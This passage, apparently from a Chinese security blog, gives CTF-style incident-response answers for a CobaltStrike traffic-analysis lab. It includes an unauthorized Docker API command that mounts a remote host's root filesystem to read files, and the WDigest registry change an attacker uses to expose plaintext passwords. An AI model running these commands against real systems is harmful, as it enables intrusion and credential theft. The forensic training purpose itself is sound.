</code></pre><p>提取一下unk_4BEFFD的信息</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>unk_4BEFFD <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0x3D</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x3A</span>, <span style=color:#ae81ff>0x36</span>, <span style=color:#ae81ff>0x58</span>, <span style=color:#ae81ff>0x3A</span>, <span style=color:#ae81ff>0x36</span>, <span style=color:#ae81ff>0x1D</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x5A</span>, <span style=color:#ae81ff>0x36</span>, <span style=color:#ae81ff>0x3A</span>, <span style=color:#ae81ff>0x5A</span>, <span style=color:#ae81ff>0x0A</span>, <span style=color:#ae81ff>0x3B</span>, <span style=color:#ae81ff>0x5A</span>, <span style=color:#ae81ff>0x1D</span>, <span style=color:#ae81ff>0x36</span>, <span style=color:#ae81ff>0x0F</span>, <span style=color:#ae81ff>0x05</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x0E</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> unk_4BEFFD:
</span></span><span style=display:flex><span>    print(chr(i<span style=color:#f92672>^</span><span style=color:#ae81ff>0x69</span>), end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span></code></pre></div><h1 id=cobaltstrike流量分析>CobaltStrike流量分析</h1><pre tabindex=0><code>[2025-08-06 14:50:47] [SUCCESS] 端口开放 69.230.239.206:2375
[2025-08-06 14:50:52] [SUCCESS] 服务识别 69.230.239.206:2375 =&gt; [http]
[2025-08-06 14:50:56] [INFO] 存活端口数量: 1
[2025-08-06 14:50:56] [INFO] 开始漏洞扫描
[2025-08-06 14:50:56] [INFO] 加载的插件: webpoc, webtitle
[2025-08-06 14:50:56] [SUCCESS] 网站标题 http://69.230.239.206:2375 状态码:404 长度:29     标题:无标题
[2025-08-06 14:50:57] [SUCCESS] 目标: http://69.230.239.206:2375
  漏洞名称: poc-yaml-docker-api-unauthorized-rce
  详细信息: author:j4ckzh0u(https://github.com/j4ckzh0u)
            links:https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce
[2025-08-06 14:50:57] [SUCCESS] 目标: http://69.230.239.206:2375
  漏洞名称: poc-yaml-go-pprof-leak
  详细信息: author:pa55w0rd(www.pa55w0rd.online/)
            links:https://cloud.tencent.com/developer/news/312276
[2025-08-06 14:51:05] [SUCCESS] 扫描已完成: 2/2
</code></pre><pre tabindex=0><code>root@dkcjbRCmYFsaLJs:~# docker -H tcp://69.230.239.206:2375 images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
nginx        latest    97662d24417b   6 months ago   192MB
</code></pre><pre tabindex=0><code>docker  -H tcp://161.189.96.3:2375 run -it   -v /:/mnt nginx  /bin/bash
</code></pre><h2 id=q1-24>Q1</h2><p>1.溯源反制，提交黑客CS服务器的flag.txt内容</p><pre tabindex=0><code>root@e622d6a17c7f:/mnt# cd root
root@e622d6a17c7f:/mnt/root# ls
flag.txt
root@e622d6a17c7f:/mnt/root# cat flag.txt
flag{6750ac374fdc3038a67e95e1f21d455c}
</code></pre><h2 id=q2-24>Q2</h2><p>2.黑客攻击主机上线时间是？(flag{YYYY-MM-DD HH:MM:SS})</p><p>看流量包</p><pre tabindex=0><code>Date: Wed, 12 Feb 2025 12:12:52 GMT
flag{2025-02-12 20:12:52}
</code></pre><h2 id=q3-24>Q3</h2><p>3.黑客使用的隧道payload名字是什么？</p><pre tabindex=0><code>C:\Users\0raN9e\Desktop\script\Misc\CS流量\CSthing\1768_v0_0_8&gt;python 1768.py FJwV
File: FJwV
xorkey(chain): 0x1f6828ff
length: 0x040e00ad
Config found: xorkey b&#39;.&#39; 0x00000000 0x000057cf
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
</code></pre><p><code>flag{windows-beacon_http-reverse_http}</code></p><h2 id=q4-21>Q4</h2><p>4.黑客获取到当前用户的明文密码是什么？</p><pre tabindex=0><code>root@e622d6a17c7f:/mnt# find  .  -name .cobaltstrike.beacon_keys
./opt/Cobalt_Strike_4.5/Cobalt_Strike_4.5/.cobaltstrike.beacon_keys
</code></pre><pre tabindex=0><code>python parse_beacon_keys.py .cobaltstrike.beacon_keys
</code></pre><pre tabindex=0><code>Raw Key (hex): a4553adf7a841e1dcf708afc912275ee
AES key: a368237121ef51b094068a2e92304d46
HMAC key: b6315feb217bd87188d06870dd92855b
</code></pre><pre tabindex=0><code>python cs-parse-http-traffic.py -r a4553adf7a841e1dcf708afc912275ee cs_res.pcapng
</code></pre><p>不好整，直接翻日志可以找到密码的</p><pre tabindex=0><code>xj@cs123
</code></pre><h2 id=q5-17>Q5</h2><p>5.黑客为了得到明文密码修改了什么？（提交flag{md5(执行的命令)}）</p><pre tabindex=0><code>flag{md5( /C reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f)}
flag{73aeb8ee98d124a1f8e87f7965dc0b4a}
</code></pre><h2 id=q6-8>Q6</h2><p>6.黑客下载的文件名称是什么？</p><pre tabindex=0><code>raw_path = b&#39;C:\\Users\\Administrator\\Desktop\\xxx\xb7\xfe\xce\xf1\xc6\xf7\xd4\xcb\xce\xac\xd0\xc5\xcf\xa2.xls&#39;
decoded_path = raw_path.decode(&#39;gbk&#39;)
print(decoded_path)

#C:\Users\Administrator\Desktop\xxx服务器运维信息.xls
</code></pre><pre tabindex=0><code>flag{xxx服务器运维信息.xlsx}
</code></pre><h2 id=q7-6>Q7</h2><p>7.黑客下载的文件内容是什么？</p><pre tabindex=0><code>find . -type f -name &#39;.xlsx&#39;
grep -r &#34;download&#34; ./logs |grep -v &#34;unknown&#34;
</code></pre><p>打开里面就有flag</p><pre tabindex=0><code>flag{752fe2f44306e782f0d6830faad59e0e}
</code></pre><h2 id=q8-4>Q8</h2><p>8.黑客上传的文件内容是什么？</p><p>图片里面有内容</p><pre tabindex=0><code>flag{hacker}
</code></pre><h2 id=q9-3>Q9</h2><p>9.黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）</p><p>读取第65334号提取出来的文件，改为png格式后，发现为chrome浏览器。</p><pre tabindex=0><code>flag{chrome}
</code></pre><h2 id=q10-3>Q10</h2><p>10.黑客读取到浏览器保存的密码是什么？</p><p>在第 123336包里读取到密码<code>0f338a1a6ad8785cee2b471d9d3e9f91</code></p><h2 id=q11-2>Q11</h2><p>11.黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）</p><p>在第127593包里，我们可以看到<code>xj.edisec.net</code>推测访问了这个网址。</p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#第一章-应急响应-webshell查杀>第一章 应急响应-webshell查杀</a><ul><li><a href=#q1>Q1</a></li><li><a href=#q2>Q2</a></li><li><a href=#q3>Q3</a></li><li><a href=#q4>Q4</a></li></ul></li><li><a href=#第一章-应急响应-linux日志分析>第一章 应急响应-Linux日志分析</a><ul><li><a href=#q1-1>Q1</a></li><li><a href=#q2-1>Q2</a></li><li><a href=#q3-1>Q3</a></li><li><a href=#q4-1>Q4</a></li><li><a href=#q5>Q5</a></li></ul></li><li><a href=#第一章-应急响应--linux入侵排查>第一章 应急响应- Linux入侵排查</a><ul><li><a href=#q1-2>Q1</a></li><li><a href=#q2-2>Q2</a></li><li><a href=#q3-2>Q3</a></li><li><a href=#q4-2>Q4</a></li><li><a href=#q5-1>Q5</a></li></ul></li><li><a href=#第二章日志分析-apache日志分析>第二章日志分析-apache日志分析</a><ul><li><a href=#q1-3>Q1</a></li><li><a href=#q2-3>Q2</a></li><li><a href=#q3-3>Q3</a></li><li><a href=#q4-3>Q4</a></li><li><a href=#q5-2>Q5</a></li></ul></li><li><a href=#第二章日志分析-redis应急响应>第二章日志分析-redis应急响应</a><ul><li><a href=#q1-4>Q1</a></li><li><a href=#q2-4>Q2</a></li><li><a href=#q3-4>Q3</a></li><li><a href=#q4-4>Q4</a></li><li><a href=#q5-3>Q5</a></li></ul></li><li><a href=#第二章日志分析-mysql应急响应>第二章日志分析-mysql应急响应</a><ul><li><a href=#q1-5>Q1</a></li><li><a href=#q2-5>Q2</a></li><li><a href=#q3-5>Q3</a></li><li><a href=#q4-5>Q4</a></li></ul></li><li><a href=#第三章-权限维持-linux权限维持-隐藏>第三章 权限维持-linux权限维持-隐藏</a><ul><li><a href=#q1-6>Q1</a></li><li><a href=#q2-6>Q2</a></li><li><a href=#q3-6>Q3</a></li><li><a href=#q4-6>Q4</a></li><li><a href=#q5-4>Q5</a></li></ul></li><li><a href=#第四章-windows实战-日志分析>第四章 windows实战-日志分析</a><ul><li><a href=#q1-7>Q1</a></li><li><a href=#q2-7>Q2</a></li><li><a href=#q3-7>Q3</a></li><li><a href=#q4-7>Q4</a></li><li><a href=#q5-5>Q5</a></li><li><a href=#q6>Q6</a></li><li><a href=#q7>Q7</a></li><li><a href=#q8>Q8</a></li></ul></li><li><a href=#第四章-windows实战-向日葵>第四章 windows实战-向日葵</a><ul><li><a href=#q1-8>Q1</a></li><li><a href=#q2-8>Q2</a></li><li><a href=#q3-8>Q3</a></li><li><a href=#q4-8>Q4</a></li><li><a href=#q5-6>Q5</a></li></ul></li><li><a href=#第五章-windows-实战-evtx-文件分析>第五章 Windows 实战-evtx 文件分析</a><ul><li><a href=#q1-9>Q1</a></li><li><a href=#q2-9>Q2</a></li><li><a href=#q3-9>Q3</a></li><li><a href=#q4-9>Q4</a></li><li><a href=#q5-7>Q5</a></li></ul></li><li><a href=#第五章-linux实战-cms01>第五章 linux实战-CMS01</a><ul><li><a href=#q1-10>Q1</a></li><li><a href=#q2-10>Q2</a></li><li><a href=#q3-10>Q3</a></li><li><a href=#q4-10>Q4</a></li><li><a href=#q5-8>Q5</a></li><li><a href=#q6-1>Q6</a></li><li><a href=#q7-1>Q7</a></li></ul></li><li><a href=#第五章-linux实战-黑链>第五章 linux实战-黑链</a><ul><li><a href=#q1-11>Q1</a></li><li><a href=#q2-11>Q2</a></li><li><a href=#q3-11>Q3</a></li><li><a href=#q4-11>Q4</a></li></ul></li><li><a href=#第六章-流量特征分析-蚁剑流量分析>第六章 流量特征分析-蚁剑流量分析</a><ul><li><a href=#q1-12>Q1</a></li><li><a href=#q2-12>Q2</a></li><li><a href=#q3-12>Q3</a></li><li><a href=#q4-12>Q4</a></li><li><a href=#q5-9>Q5</a></li><li><a href=#q6-2>Q6</a></li></ul></li><li><a href=#第六章-流量特征分析-蚂蚁爱上树>第六章 流量特征分析-蚂蚁爱上树</a><ul><li><a href=#q1-13>Q1</a></li><li><a href=#q2-13>Q2</a></li><li><a href=#q3-13>Q3</a></li></ul></li><li><a href=#第六章-流量特征分析-常见攻击事件-tomcat>第六章 流量特征分析-常见攻击事件 tomcat</a><ul><li><a href=#q1-14>Q1</a></li><li><a href=#q2-14>Q2</a></li><li><a href=#q3-14>Q3</a></li><li><a href=#q4-13>Q4</a></li><li><a href=#q5-10>Q5</a></li><li><a href=#q6-3>Q6</a></li><li><a href=#q7-2>Q7</a></li></ul></li><li><a href=#第六章-流量特征分析-小王公司收到的钓鱼邮件>第六章 流量特征分析-小王公司收到的钓鱼邮件</a><ul><li><a href=#q1-15>Q1</a></li><li><a href=#q2-15>Q2</a></li><li><a href=#q3-15>Q3</a></li></ul></li><li><a href=#第六章-流量特征分析-waf-上的截获的黑客攻击流量>第六章 流量特征分析-waf 上的截获的黑客攻击流量</a><ul><li><a href=#q1-16>Q1</a></li><li><a href=#q2-16>Q2</a></li><li><a href=#q3-16>Q3</a></li></ul></li><li><a href=#第六章-哥斯拉40流量分析>第六章-哥斯拉4.0流量分析</a><ul><li><a href=#q1-17>Q1</a></li><li><a href=#q2-17>Q2</a></li><li><a href=#q3-17>Q3</a></li><li><a href=#q4-14>Q4</a></li><li><a href=#q5-11>Q5</a></li><li><a href=#q6-4>Q6</a></li><li><a href=#q7-3>Q7</a></li><li><a href=#q8-1>Q8</a></li><li><a href=#q9>Q9</a></li><li><a href=#q10>Q10</a></li><li><a href=#q11>Q11</a></li><li><a href=#q12>Q12</a></li><li><a href=#q13>Q13</a></li></ul></li><li><a href=#第七章-常见攻击事件分析钓鱼邮件>第七章 常见攻击事件分析&ndash;钓鱼邮件</a><ul><li><a href=#q1-18>Q1</a></li><li><a href=#q2-18>Q2</a></li><li><a href=#q3-18>Q3</a></li><li><a href=#q4-15>Q4</a></li></ul></li><li><a href=#第九章-blueteam-的小心思>第九章-blueteam 的小心思</a><ul><li><a href=#q1-19>Q1</a></li><li><a href=#q2-19>Q2</a></li><li><a href=#q3-19>Q3</a></li><li><a href=#q4-16>Q4</a></li><li><a href=#q5-12>Q5</a></li><li><a href=#q6-5>Q6</a></li><li><a href=#q7-4>Q7</a></li><li><a href=#q8-2>Q8</a></li><li><a href=#q9-1>Q9</a></li></ul></li><li><a href=#blue-team2为什么没有>blue team2为什么没有！！！</a><ul><li><a href=#q10-1>Q10</a></li></ul></li><li><a href=#第九章-blueteam-的小心思3>第九章-blueteam 的小心思3</a><ul><li><a href=#q1-20>Q1</a></li><li><a href=#q2-20>Q2</a></li><li><a href=#q3-20>Q3</a></li><li><a href=#q4-17>Q4</a></li><li><a href=#q5-13>Q5</a></li></ul></li><li><a href=#linux后门应急>Linux后门应急</a><ul><li><a href=#q1-21>Q1</a></li><li><a href=#q2-21>Q2</a></li><li><a href=#q3-21>Q3</a></li><li><a href=#q4-18>Q4</a></li><li><a href=#q5-14>Q5</a></li><li><a href=#q6-6>Q6</a></li><li><a href=#q7-5>Q7</a></li><li><a href=#q8-3>Q8</a></li><li><a href=#q9-2>Q9</a></li><li><a href=#q10-2>Q10</a></li><li><a href=#q11-1>Q11</a></li></ul></li><li><a href=#2024长城杯ciscn-威胁流量分析-zeroshell>2024长城杯&amp;CISCN-威胁流量分析-zeroshell</a><ul><li><a href=#q1-22>Q1</a></li><li><a href=#q2-22>Q2</a></li><li><a href=#q3-22>Q3</a></li><li><a href=#q4-19>Q4</a></li><li><a href=#q5-15>Q5</a></li><li><a href=#q6-7>Q6</a></li></ul></li><li><a href=#第二届长城杯ciscn半决赛-应急响应>第二届长城杯&amp;CISCN半决赛-应急响应</a><ul><li><a href=#q1-23>Q1</a></li><li><a href=#q2-23>Q2</a></li><li><a href=#q3-23>Q3</a></li><li><a href=#q4-20>Q4</a></li><li><a href=#q5-16>Q5</a></li></ul></li><li><a href=#cobaltstrike流量分析>CobaltStrike流量分析</a><ul><li><a href=#q1-24>Q1</a></li><li><a href=#q2-24>Q2</a></li><li><a href=#q3-24>Q3</a></li><li><a href=#q4-21>Q4</a></li><li><a href=#q5-17>Q5</a></li><li><a href=#q6-8>Q6</a></li><li><a href=#q7-6>Q7</a></li><li><a href=#q8-4>Q8</a></li><li><a href=#q9-3>Q9</a></li><li><a href=#q10-3>Q10</a></li><li><a href=#q11-2>Q11</a></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=next href=http://blog.0ran9e.cn/posts/ctf/buuctf-web/><span class=title>»</span><br><span>Re:从零开始的BUU的web生活</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer><button id=tocToggleBtn type=button aria-label="Toggle Table of Contents">收起</button>
<script>(function(){const s=document.querySelector("article.post-single > details.toc"),e=document.getElementById("tocToggleBtn");if(!s||!e){e&&(e.style.display="none");return}const t="toc_hidden",n=()=>{const n=localStorage.getItem(t)==="1";document.documentElement.classList.toggle("toc-hidden",n),e.textContent=n?"目录":"收起"};e.addEventListener("click",()=>{const e=!document.documentElement.classList.contains("toc-hidden");localStorage.setItem(t,e?"1":"0"),n()}),n()})()</script><script>(function(){const t=document.getElementById("theme-toggle");if(!t)return;const s="pref-theme",e=document.documentElement,n=t=>{const n=t==="dark";e.classList.toggle("dark",n);try{localStorage.setItem(s,t)}catch{}e.style.display="none",e.offsetHeight,e.style.display=""},o=()=>{let e=null;try{e=localStorage.getItem(s)}catch{}if(e==="dark"||e==="light")return n(e);window.matchMedia&&n(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")};t.dataset.boundTheme||(t.addEventListener("click",()=>{const t=e.classList.contains("dark");n(t?"light":"dark")}),t.dataset.boundTheme="1"),o()})()</script></body></html>